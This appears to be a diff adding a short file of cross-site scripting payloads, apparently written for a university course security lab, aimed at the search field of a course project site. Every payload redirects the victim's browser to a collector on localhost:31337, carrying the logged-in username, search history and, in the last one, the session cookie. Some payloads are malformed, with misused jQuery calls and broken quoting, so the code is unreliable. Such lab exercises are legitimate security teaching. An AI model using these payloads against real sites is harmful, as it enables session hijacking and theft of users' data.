@@ -1,0 +1,10 @@
+<script>document.location="http://localhost:31337/?stolen_user=" + document.getElementById("logged-in-user").innerHTML + "&last_search=" + $(document).ready(function(){
+document.getElementById("history-list").getElementsByClassName("list-group")})</script>
+
+
+
+<script>document.location="http://localhost:31337/?stolen_user=" + document.getElementById("logged-in-user").innerHTML + "&last_search=" + $(document).ready(document.getElementById("history-list").getElementsByClassName("list-group"))</script>
+
+https://project2.ecen4133.org/search?q=<script>document.location="http://localhost:31337/?stolen_user=" %2B document.getElementById("logged-in-user").innerHTML %2B"&last_search=last_search"</script>
+
+https://project2.ecen4133.org/search?q=%3Cscript%3Edocument.location=%22http://localhost:31337/?stolen_user=%22%20%2B%20document.getElementById(%22logged-in-user%22).innerHTML%2b%22%26last_search="%2bdocument.cookie%22%3C/script%3E
